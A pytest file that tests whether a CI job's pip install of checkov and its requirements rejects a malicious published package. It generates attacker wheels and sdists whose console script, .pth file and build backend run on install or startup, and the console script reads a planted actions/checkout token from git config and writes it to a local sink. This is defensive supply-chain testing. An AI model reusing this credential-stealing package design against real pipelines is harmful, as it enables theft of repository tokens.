"""Supply-chain tests for the control-library CI install.

These tests fail while the job installs checkov, or a requirements.txt
dependency, without an exact version and a hash. They pass once that install
rejects a publisher-controlled artifact before any of its code runs, and the
validator no longer executes that artifact.

The tests build the attacker release themselves and serve it from a local
index. pip's own resolver, installer, and script generator process it. The
control-library validator is the real script.

Not covered here, and still unpinned in this commit:
- .github/workflows/python-lint.yml installs ruff and then runs it
- .github/workflows/shell-checks.yml installs pydantic and pyyaml ranges
- .github/workflows/contract-parity.yml and secret-boundary.yml install
  requirements.txt and then run the CDK app or pytest
- .gitlab-ci.yml jobs ruff, shell, pytest, and cdk-synth
"""

from __future__ import annotations

import base64
import hashlib
import io
import os
import re
import shlex
import shutil
import subprocess
import sys
import tarfile
import textwrap
import zipfile
from dataclasses import dataclass
from pathlib import Path

import pytest
from pip._vendor.packaging.requirements import Requirement
from pip._vendor.packaging.specifiers import SpecifierSet
from pip._vendor.packaging.utils import canonicalize_name

REPO_ROOT = Path(__file__).resolve().parents[1]
PLACEHOLDER_TOKEN = "placeholder-token-not-real"
POLICY_RELATIVE = Path("control-library/scp/gateway/deny-no-auth.json")
CATALOG_RELATIVE = Path("control-library/catalog.yaml")

# The validator's pytest step would collect this file and recurse. Install-time
# and .pth execution of those same distributions is covered by the validator
# process, which starts after the install in the same environment.
_SKIPPED_FOLLOWUPS = ("pytest",)


@dataclass(frozen=True)
class InstallReq:
    spec: str
    hashes: tuple[str, ...]

    @property
    def requirement(self) -> Requirement:
        return Requirement(self.spec)

    @property
    def name(self) -> str:
        return canonicalize_name(self.requirement.name)


@dataclass(frozen=True)
class InstallPlan:
    script: str
    requirements: tuple[InstallReq, ...]
    hash_enforced: bool


def test_github_control_library_wheel_cannot_read_checkout():
    """A wheel release pip would select must not run from the validator."""
    _exercise_control_library(
        _github_control_library_steps(),
        artifact="wheel",
    )


def test_github_control_library_sdist_cannot_run_during_install():
    """An sdist release must not run its build backend during the install."""
    _exercise_control_library(
        _github_control_library_steps(),
        artifact="sdist",
    )


def test_gitlab_control_library_wheel_cannot_read_checkout():
    _exercise_control_library(
        _gitlab_control_library_steps(),
        artifact="wheel",
    )


def test_gitlab_control_library_sdist_cannot_run_during_install():
    _exercise_control_library(
        _gitlab_control_library_steps(),
        artifact="sdist",
    )


def _exercise_control_library(steps: list[str], artifact: str) -> None:
    installs = [step for step in steps if _is_pip_install(step)]
    follows = [
        step
        for step in steps
        if "validate_control_library.py" in step
        and not any(token in step for token in _SKIPPED_FOLLOWUPS)
    ]
    assert installs, "control-library job no longer has an install step to execute"
    assert follows, "control-library job no longer runs validate_control_library.py"
    plan = _plan_install(installs[0], REPO_ROOT)
    assert any(req.name == "checkov" for req in plan.requirements)

    root = Path(os.environ.get("TMPDIR", "/tmp")) / (
        "checkov-supply-" + artifact + "-" + hashlib.sha256(installs[0].encode()).hexdigest()[:8]
    )
    if root.exists():
        shutil.rmtree(root)
    root.mkdir(parents=True)
    try:
        sink = root / "attacker-sink"
        clone = root / "repo"
        subprocess.run(
            ["git", "clone", "--quiet", "--local", str(REPO_ROOT), str(clone)],
            check=True,
        )
        _plant_checkout_credential(clone, root / "runner-temp")
        index = _build_index(root / "index", plan.requirements, artifact, sink, clone)
        env = _job_env(root / "venv", index)
        install = subprocess.run(
            ["bash", "-e", "-c", installs[0]],
            cwd=clone,
            env=env,
            text=True,
            capture_output=True,
        )
        follow = None
        if install.returncode == 0:
            follow = subprocess.run(
                ["bash", "-e", "-c", follows[0]],
                cwd=clone,
                env=env,
                text=True,
                capture_output=True,
            )
        executed = sorted(path.name for path in sink.glob("*")) if sink.exists() else []
        if executed:
            pytest.fail(
                "publisher code from the unpinned install ran "
                f"({artifact}): {executed}\n"
                + _tail(install)
                + ("" if follow is None else _tail(follow))
            )
        if install.returncode != 0:
            if plan.hash_enforced:
                return
            pytest.fail(
                "install exited before publisher code ran, and the job does "
                "not require hashes for every installed distribution:\n"
                + _tail(install)
            )
        if _attacker_dists_installed(root / "venv", plan.requirements):
            pytest.fail(
                "the attacker release installed without its payload running\n"
                + _tail(install)
            )
    finally:
        shutil.rmtree(root, ignore_errors=True)


def _github_control_library_steps() -> list[str]:
    text = (REPO_ROOT / ".github/workflows/control-library.yml").read_text()
    steps = _github_job_run_scripts(text, "validate-control-library")
    selected = [
        script
        for script in steps
        if _is_pip_install(script) or "validate_control_library.py" in script
    ]
    assert selected, "could not read the control-library job steps"
    return selected


def _gitlab_control_library_steps() -> list[str]:
    text = (REPO_ROOT / ".gitlab-ci.yml").read_text()
    body = _gitlab_job_body(text, "control-library")
    commands = _gitlab_script_commands(body, "before_script") + _gitlab_script_commands(
        body, "script"
    )
    selected = [
        command
        for command in commands
        if _is_pip_install(command) or "validate_control_library.py" in command
    ]
    assert selected, "could not read the GitLab control-library job"
    return selected


def _github_job_run_scripts(text: str, job_name: str) -> list[str]:
    lines = text.splitlines()
    start = None
    for index, line in enumerate(lines):
        if line.startswith(f"  {job_name}:"):
            start = index + 1
            break
    if start is None:
        return []
    body: list[str] = []
    for line in lines[start:]:
        if re.match(r"^  [A-Za-z0-9_-]+:\s*$", line):
            break
        body.append(line)
    scripts: list[str] = []
    index = 0
    while index < len(body):
        match = re.match(r"^(\s*)run:\s*(.*)$", body[index])
        if not match:
            index += 1
            continue
        indent = len(match.group(1))
        rest = match.group(2).strip()
        index += 1
        if rest in {"|", ">", "|-", ">-", "|+", ">+"}:
            block: list[str] = []
            while index < len(body):
                nxt = body[index]
                if nxt.strip() == "":
                    block.append("")
                    index += 1
                    continue
                next_indent = len(nxt) - len(nxt.lstrip(" "))
                if next_indent <= indent:
                    break
                block.append(nxt[indent:])
                index += 1
            scripts.append(textwrap.dedent("\n".join(block)).strip())
        else:
            scripts.append(rest)
    return scripts


def _gitlab_job_body(text: str, job_name: str) -> list[str]:
    lines = text.splitlines()
    start = None
    for index, line in enumerate(lines):
        if line.startswith(f"{job_name}:"):
            start = index + 1
            break
    if start is None:
        return []
    body: list[str] = []
    for line in lines[start:]:
        if line and not line.startswith((" ", "\t", "#")):
            break
        body.append(line)
    return body


def _gitlab_script_commands(body: list[str], key: str) -> list[str]:
    commands: list[str] = []
    collecting = False
    key_indent = None
    for line in body:
        if not collecting:
            match = re.match(rf"^(\s*){re.escape(key)}:\s*$", line)
            if match:
                collecting = True
                key_indent = len(match.group(1))
            continue
        if line.strip() == "" or line.lstrip().startswith("#"):
            continue
        indent = len(line) - len(line.lstrip(" "))
        if indent <= (key_indent or 0):
            break
        item = re.match(r"^\s*-\s*(.*)$", line)
        if item:
            commands.append(item.group(1).strip())
    return commands


def _is_pip_install(script: str) -> bool:
    return re.search(r"(^|\n)\s*pip\s+install\b", script) is not None or (
        "pip install" in script
    )


def _plan_install(script: str, cwd: Path) -> InstallPlan:
    requirements: list[InstallReq] = []
    hash_flag = "--require-hashes" in script
    for raw_line in script.splitlines():
        line = raw_line.strip()
        if not line or line.startswith("#") or "pip" not in line:
            continue
        tokens = shlex.split(line)
        if "install" not in tokens:
            continue
        cursor = tokens.index("install") + 1
        while cursor < len(tokens):
            token = tokens[cursor]
            if token in {"-r", "--requirement", "-c", "--constraint"}:
                cursor += 1
                requirements.extend(_read_requirement_file(cwd / tokens[cursor]))
            elif token in {
                "-i",
                "--index-url",
                "--extra-index-url",
                "-f",
                "--find-links",
                "-t",
                "--target",
                "--prefix",
            }:
                cursor += 1
            elif token == "--require-hashes":
                hash_flag = True
            elif token.startswith("-"):
                pass
            else:
                requirements.append(_split_requirement(token))
            cursor += 1
    enforced = hash_flag or (
        bool(requirements) and all(item.hashes for item in requirements)
    )
    return InstallPlan(script, tuple(requirements), enforced)


def _read_requirement_file(path: Path) -> list[InstallReq]:
    requirements: list[InstallReq] = []
    for raw_line in path.read_text().splitlines():
        line = raw_line.split("#", 1)[0].strip()
        if not line or line.startswith(("-r", "--requirement", "-c", "--constraint")):
            if line.startswith(("-r", "--requirement")):
                nested = line.split(None, 1)[1]
                requirements.extend(_read_requirement_file(path.parent / nested))
            continue
        if line.startswith("-"):
            continue
        requirements.append(_split_requirement(line))
    return requirements


def _split_requirement(line: str) -> InstallReq:
    hashes = tuple(re.findall(r"--hash(?:=|\s+)sha256:([A-Fa-f0-9]+)", line))
    spec = re.sub(r"\s*--hash(?:=|\s+)\S+", "", line).strip()
    return InstallReq(spec, hashes)


def _choose_version(specifier: SpecifierSet) -> str:
    equals = [item.version for item in specifier if item.operator in {"==", "==="}]
    if len(equals) == 1:
        return equals[0]
    probes = ["9999.0.0", "10.9.9", "2.99.0", "9.9.9", "6.9.9", "1.99.0", "0.99.0"]
    for item in specifier:
        if item.operator in {"<=", "<"}:
            probes.insert(0, item.version)
    for probe in probes:
        if specifier.contains(probe, prereleases=False):
            return probe
    raise AssertionError(f"no attacker version satisfies {specifier}")


def _build_index(
    root: Path,
    requirements: tuple[InstallReq, ...],
    artifact: str,
    sink: Path,
    repo: Path,
) -> Path:
    simple = root / "simple"
    packages = root / "packages"
    packages.mkdir(parents=True)
    for req in requirements:
        version = _choose_version(req.requirement.specifier)
        filename, payload = _render_artifact(
            req.name, version, artifact, sink, repo
        )
        target = packages / filename
        target.write_bytes(payload)
        digest = hashlib.sha256(payload).hexdigest()
        project = simple / _pep503_name(req.name)
        project.mkdir(parents=True)
        link = f"../../packages/{filename}#sha256={digest}"
        (project / "index.html").write_text(
            "<!DOCTYPE html><html><body>"
            f'<a href="{link}">{filename}</a>'
            "</body></html>\n"
        )
    return simple


def _render_artifact(
    name: str,
    version: str,
    artifact: str,
    sink: Path,
    repo: Path,
) -> tuple[str, bytes]:
    if artifact == "wheel":
        filename = f"{_wheel_name(name)}-{version}-py3-none-any.whl"
        return filename, _wheel_bytes(name, version, sink, repo)
    filename = f"{_wheel_name(name).replace('_', '-')}-{version}.tar.gz"
    return filename, _sdist_bytes(name, version, sink, repo)


def _wheel_bytes(name: str, version: str, sink: Path, repo: Path) -> bytes:
    info = f"{_wheel_name(name)}-{version}.dist-info"
    files: dict[str, bytes] = {
        f"{info}/METADATA": (
            "Metadata-Version: 2.1\n"
            f"Name: {name}\n"
            f"Version: {version}\n"
            "Summary: publisher-controlled fixture\n"
        ).encode(),
        f"{info}/WHEEL": (
            "Wheel-Version: 1.0\n"
            "Generator: supply-chain-fixture\n"
            "Root-Is-Purelib: true\n"
            "Tag: py3-none-any\n"
        ).encode(),
        f"{_import_root(name)}/__init__.py": _module_init(name, sink).encode(),
        _pth_name(name): _pth_line(name, sink).encode(),
    }
    if name == "checkov":
        files["checkov/cli.py"] = _checkov_cli(sink, repo).encode()
        files[f"{info}/entry_points.txt"] = (
            "[console_scripts]\ncheckov = checkov.cli:main\n"
        ).encode()
    return _zip_wheel(info, files)


def _sdist_bytes(name: str, version: str, sink: Path, repo: Path) -> bytes:
    folder = f"{name}-{version}"
    backend = _backend_source(name, version, sink, repo)
    pyproject = (
        "[build-system]\n"
        "requires = []\n"
        'build-backend = "backend"\n'
        'backend-path = ["."]\n\n'
        "[project]\n"
        f'name = "{name}"\n'
        f'version = "{version}"\n'
    )
    info = (
        "Metadata-Version: 2.1\n"
        f"Name: {name}\n"
        f"Version: {version}\n"
    )
    blob = _tar_bytes(
        {
            f"{folder}/pyproject.toml": pyproject.encode(),
            f"{folder}/backend.py": backend.encode(),
            f"{folder}/PKG-INFO": info.encode(),
        }
    )
    return blob


def _backend_source(name: str, version: str, sink: Path, repo: Path) -> str:
    marker = f"sdist-build-{name}"
    wheel_literal = repr(_wheel_bytes(name, version, sink, repo))
    filename = f"{_wheel_name(name)}-{version}-py3-none-any.whl"
    return (
        "from pathlib import Path\n"
        f"Path({str(sink)!r}).mkdir(parents=True, exist_ok=True)\n"
        f"Path({str(sink / marker)!r}).write_text('executed\\n')\n"
        f"_WHEEL = {wheel_literal}\n"
        "def get_requires_for_build_wheel(config_settings=None):\n"
        "    return []\n"
        "def build_wheel(wheel_directory, config_settings=None, metadata_directory=None):\n"
        f"    target = Path(wheel_directory) / '{filename}'\n"
        "    target.write_bytes(_WHEEL)\n"
        "    return target.name\n"
    )


def _module_init(name: str, sink: Path) -> str:
    if name != "pyyaml":
        return ""
    return (
        "from pathlib import Path\n"
        f"_SINK = Path({str(sink)!r})\n"
        "def safe_load(stream):\n"
        "    _SINK.mkdir(parents=True, exist_ok=True)\n"
        "    (_SINK / 'import-pyyaml').write_text('executed\\n')\n"
        "    return {}\n"
    )


def _checkov_cli(sink: Path, repo: Path) -> str:
    return textwrap.dedent(
        f"""\
        import base64
        import re
        import subprocess
        from pathlib import Path

        SINK = Path({str(sink)!r})
        REPO = Path({str(repo)!r})

        def main():
            SINK.mkdir(parents=True, exist_ok=True)
            for relative in ({str(POLICY_RELATIVE)!r}, {str(CATALOG_RELATIVE)!r}):
                source = REPO / relative
                if source.is_file():
                    (SINK / source.name).write_bytes(source.read_bytes())
            listed = subprocess.check_output(
                ["git", "config", "--local", "--get-regexp", r"^includeIf\\.gitdir:"],
                cwd=REPO,
                text=True,
            )
            decoded = []
            for line in listed.splitlines():
                credential_path = line.split(None, 1)[1]
                body = Path(credential_path).read_text()
                for match in re.finditer(r"AUTHORIZATION: basic (\\S+)", body):
                    decoded.append(base64.b64decode(match.group(1)).decode())
            if decoded:
                (SINK / "checkout-credential.txt").write_text("\\n".join(decoded))
            return 0
        """
    )


def _pth_line(name: str, sink: Path) -> str:
    target = sink / f"pth-{name}"
    return (
        "import pathlib; "
        f"pathlib.Path({str(sink)!r}).mkdir(parents=True, exist_ok=True); "
        f"pathlib.Path({str(target)!r}).write_text('executed\\n')\n"
    )


def _zip_wheel(info: str, files: dict[str, bytes]) -> bytes:
    record_lines = []
    for path in sorted(files):
        digest = hashlib.sha256(files[path]).digest()
        encoded = base64.urlsafe_b64encode(digest).decode().rstrip("=")
        record_lines.append(f"{path},sha256={encoded},{len(files[path])}")
    record_lines.append(f"{info}/RECORD,,")
    files[f"{info}/RECORD"] = ("\n".join(record_lines) + "\n").encode()
    blob = io.BytesIO()
    with zipfile.ZipFile(blob, "w") as archive:
        for path, content in files.items():
            archive.writestr(path, content)
    return blob.getvalue()


def _tar_bytes(files: dict[str, bytes]) -> bytes:
    blob = io.BytesIO()
    with tarfile.open(fileobj=blob, mode="w:gz") as archive:
        for path, content in files.items():
            info = tarfile.TarInfo(path)
            info.size = len(content)
            archive.addfile(info, io.BytesIO(content))
    return blob.getvalue()


def _plant_checkout_credential(repo: Path, runner_temp: Path) -> None:
    """Reproduce actions/checkout persist-credentials layout with a placeholder."""
    runner_temp.mkdir(parents=True)
    basic = base64.b64encode(
        f"x-access-token:{PLACEHOLDER_TOKEN}".encode()
    ).decode()
    credential = runner_temp / (
        "git-credentials-00000000-0000-4000-8000-000000000001.config"
    )
    subprocess.run(
        [
            "git",
            "config",
            "--file",
            str(credential),
            "http.https://github.com/.extraheader",
            f"AUTHORIZATION: basic {basic}",
        ],
        check=True,
    )
    git_dir = (repo / ".git").resolve().as_posix()
    subprocess.run(
        [
            "git",
            "config",
            "--local",
            f"includeIf.gitdir:{git_dir}.path",
            str(credential.resolve()),
        ],
        cwd=repo,
        check=True,
    )


def _job_env(venv: Path, index: Path) -> dict[str, str]:
    subprocess.run([sys.executable, "-m", "venv", str(venv)], check=True)
    env = os.environ.copy()
    env.pop("PYTHONPATH", None)
    env["VIRTUAL_ENV"] = str(venv)
    env["PATH"] = str(venv / "bin") + os.pathsep + env.get("PATH", "")
    env["PIP_INDEX_URL"] = index.resolve().as_uri() + "/"
    env["PIP_NO_CACHE_DIR"] = "1"
    env["PIP_DISABLE_PIP_VERSION_CHECK"] = "1"
    env["PYTHONDONTWRITEBYTECODE"] = "1"
    return env


def _attacker_dists_installed(venv: Path, requirements: tuple[InstallReq, ...]) -> bool:
    shown = subprocess.run(
        [str(venv / "bin" / "pip"), "list", "--format", "freeze"],
        text=True,
        capture_output=True,
        check=False,
    )
    installed = {
        canonicalize_name(line.split("==", 1)[0]): line.split("==", 1)[1]
        for line in shown.stdout.splitlines()
        if "==" in line
    }
    for req in requirements:
        version = _choose_version(req.requirement.specifier)
        if installed.get(req.name) == version:
            return True
    return False


def _tail(result: subprocess.CompletedProcess[str]) -> str:
    text = (result.stdout or "") + "\n" + (result.stderr or "")
    lines = text.strip().splitlines()
    kept = "\n".join(lines[-40:])
    return f"\nexit {result.returncode}\n{kept}\n"


def _pep503_name(name: str) -> str:
    return re.sub(r"[-_.]+", "-", name).lower()


def _wheel_name(name: str) -> str:
    return re.sub(r"[-_.]+", "_", name).lower()


def _import_root(name: str) -> str:
    if name == "pyyaml":
        return "yaml"
    return _wheel_name(name)


def _pth_name(name: str) -> str:
    return f"publisher-exec-{_wheel_name(name)}.pth"
